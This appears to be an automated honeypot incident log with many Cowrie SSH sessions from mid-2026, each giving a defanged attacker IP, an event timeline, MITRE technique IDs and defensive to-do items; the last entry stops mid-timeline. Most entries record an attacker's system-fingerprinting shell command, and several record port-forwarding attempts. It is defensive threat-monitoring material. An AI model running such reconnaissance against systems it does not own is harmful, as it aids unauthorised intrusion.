### 🔴 HIGH · IR-697ee8094556

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:33 |
| **Last Seen** | 2026-07-10 11:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:33:29` | `cowrie.session.connect` |
| `2026-07-10 11:33:29` | `cowrie.client.version` |
| `2026-07-10 11:33:29` | `cowrie.client.kex` |
| `2026-07-10 11:33:30` | `cowrie.login.success` |
| `2026-07-10 11:33:31` | `cowrie.session.params` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.command.success` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.command.input` |
| `2026-07-10 11:33:31` | `cowrie.log.closed` |
| `2026-07-10 11:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d1f4d1fc0e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 11:34 |
| **Last Seen** | 2026-07-10 11:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:34:02` | `cowrie.session.connect` |
| `2026-07-10 11:34:03` | `cowrie.client.version` |
| `2026-07-10 11:34:03` | `cowrie.client.kex` |
| `2026-07-10 11:34:10` | `cowrie.login.success` |
| `2026-07-10 11:34:13` | `cowrie.session.params` |
| `2026-07-10 11:34:13` | `cowrie.command.input` |
| `2026-07-10 11:34:15` | `cowrie.log.closed` |
| `2026-07-10 11:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e77beb8ce1d6

| Field | Detail |
|---|---|
| **Source IP** | `49.229.157[.]48` |
| **First Seen** | 2026-07-10 11:34 |
| **Last Seen** | 2026-07-10 11:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:34:21` | `cowrie.session.connect` |
| `2026-07-10 11:34:22` | `cowrie.client.version` |
| `2026-07-10 11:34:22` | `cowrie.client.kex` |
| `2026-07-10 11:34:25` | `cowrie.login.success` |
| `2026-07-10 11:34:26` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.229.157[.]48` to AbuseIPDB if not already reported
- [ ] Block `49.229.157[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e83dcc3527f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:34 |
| **Last Seen** | 2026-07-10 11:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:34:45` | `cowrie.session.connect` |
| `2026-07-10 11:34:46` | `cowrie.client.version` |
| `2026-07-10 11:34:46` | `cowrie.client.kex` |
| `2026-07-10 11:34:46` | `cowrie.login.success` |
| `2026-07-10 11:34:47` | `cowrie.session.params` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:47` | `cowrie.command.success` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:47` | `cowrie.command.input` |
| `2026-07-10 11:34:48` | `cowrie.log.closed` |
| `2026-07-10 11:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e1c39922a18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:36 |
| **Last Seen** | 2026-07-10 11:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:36:01` | `cowrie.session.connect` |
| `2026-07-10 11:36:01` | `cowrie.client.version` |
| `2026-07-10 11:36:01` | `cowrie.client.kex` |
| `2026-07-10 11:36:02` | `cowrie.login.success` |
| `2026-07-10 11:36:03` | `cowrie.session.params` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.command.success` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.command.input` |
| `2026-07-10 11:36:03` | `cowrie.log.closed` |
| `2026-07-10 11:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d05b75fdd335

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:37 |
| **Last Seen** | 2026-07-10 11:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:37:17` | `cowrie.session.connect` |
| `2026-07-10 11:37:17` | `cowrie.client.version` |
| `2026-07-10 11:37:17` | `cowrie.client.kex` |
| `2026-07-10 11:37:18` | `cowrie.login.success` |
| `2026-07-10 11:37:19` | `cowrie.session.params` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.command.success` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.command.input` |
| `2026-07-10 11:37:19` | `cowrie.log.closed` |
| `2026-07-10 11:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8972a256c8cd

| Field | Detail |
|---|---|
| **Source IP** | `219.248.65[.]30` |
| **First Seen** | 2026-07-10 11:37 |
| **Last Seen** | 2026-07-10 11:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:37:30` | `cowrie.session.connect` |
| `2026-07-10 11:37:31` | `cowrie.client.version` |
| `2026-07-10 11:37:31` | `cowrie.client.kex` |
| `2026-07-10 11:37:33` | `cowrie.login.success` |
| `2026-07-10 11:37:33` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.248.65[.]30` to AbuseIPDB if not already reported
- [ ] Block `219.248.65[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa6a4759574f

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-07-10 11:37 |
| **Last Seen** | 2026-07-10 11:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:37:39` | `cowrie.session.connect` |
| `2026-07-10 11:37:40` | `cowrie.client.version` |
| `2026-07-10 11:37:40` | `cowrie.client.kex` |
| `2026-07-10 11:37:41` | `cowrie.login.success` |
| `2026-07-10 11:37:42` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c118d27b545

| Field | Detail |
|---|---|
| **Source IP** | `191.241.142[.]170` |
| **First Seen** | 2026-07-10 11:37 |
| **Last Seen** | 2026-07-10 11:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:37:46` | `cowrie.session.connect` |
| `2026-07-10 11:37:47` | `cowrie.client.version` |
| `2026-07-10 11:37:47` | `cowrie.client.kex` |
| `2026-07-10 11:37:50` | `cowrie.login.success` |
| `2026-07-10 11:37:51` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.241.142[.]170` to AbuseIPDB if not already reported
- [ ] Block `191.241.142[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ee840bbe42

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:38 |
| **Last Seen** | 2026-07-10 11:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:38:33` | `cowrie.session.connect` |
| `2026-07-10 11:38:33` | `cowrie.client.version` |
| `2026-07-10 11:38:33` | `cowrie.client.kex` |
| `2026-07-10 11:38:34` | `cowrie.login.success` |
| `2026-07-10 11:38:35` | `cowrie.session.params` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.command.success` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.command.input` |
| `2026-07-10 11:38:35` | `cowrie.log.closed` |
| `2026-07-10 11:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d846b707c95e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:39 |
| **Last Seen** | 2026-07-10 11:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:39:54` | `cowrie.session.connect` |
| `2026-07-10 11:39:54` | `cowrie.client.version` |
| `2026-07-10 11:39:54` | `cowrie.client.kex` |
| `2026-07-10 11:39:55` | `cowrie.login.success` |
| `2026-07-10 11:39:56` | `cowrie.session.params` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.command.success` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.command.input` |
| `2026-07-10 11:39:56` | `cowrie.log.closed` |
| `2026-07-10 11:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9526255ce267

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:41 |
| **Last Seen** | 2026-07-10 11:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:41:12` | `cowrie.session.connect` |
| `2026-07-10 11:41:12` | `cowrie.client.version` |
| `2026-07-10 11:41:12` | `cowrie.client.kex` |
| `2026-07-10 11:41:14` | `cowrie.login.success` |
| `2026-07-10 11:41:15` | `cowrie.session.params` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.command.success` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.command.input` |
| `2026-07-10 11:41:15` | `cowrie.log.closed` |
| `2026-07-10 11:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63913e08bf95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:42 |
| **Last Seen** | 2026-07-10 11:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:42:28` | `cowrie.session.connect` |
| `2026-07-10 11:42:28` | `cowrie.client.version` |
| `2026-07-10 11:42:28` | `cowrie.client.kex` |
| `2026-07-10 11:42:29` | `cowrie.login.success` |
| `2026-07-10 11:42:30` | `cowrie.session.params` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.command.success` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.command.input` |
| `2026-07-10 11:42:30` | `cowrie.log.closed` |
| `2026-07-10 11:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb0ecef4f2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:43 |
| **Last Seen** | 2026-07-10 11:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:43:43` | `cowrie.session.connect` |
| `2026-07-10 11:43:43` | `cowrie.client.version` |
| `2026-07-10 11:43:43` | `cowrie.client.kex` |
| `2026-07-10 11:43:44` | `cowrie.login.success` |
| `2026-07-10 11:43:45` | `cowrie.session.params` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.command.success` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.command.input` |
| `2026-07-10 11:43:45` | `cowrie.log.closed` |
| `2026-07-10 11:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-261c67ff6c44

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:45 |
| **Last Seen** | 2026-07-10 11:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:45:01` | `cowrie.session.connect` |
| `2026-07-10 11:45:01` | `cowrie.client.version` |
| `2026-07-10 11:45:01` | `cowrie.client.kex` |
| `2026-07-10 11:45:02` | `cowrie.login.success` |
| `2026-07-10 11:45:03` | `cowrie.session.params` |
| `2026-07-10 11:45:03` | `cowrie.command.input` |
| `2026-07-10 11:45:03` | `cowrie.command.input` |
| `2026-07-10 11:45:03` | `cowrie.command.input` |
| `2026-07-10 11:45:03` | `cowrie.command.input` |
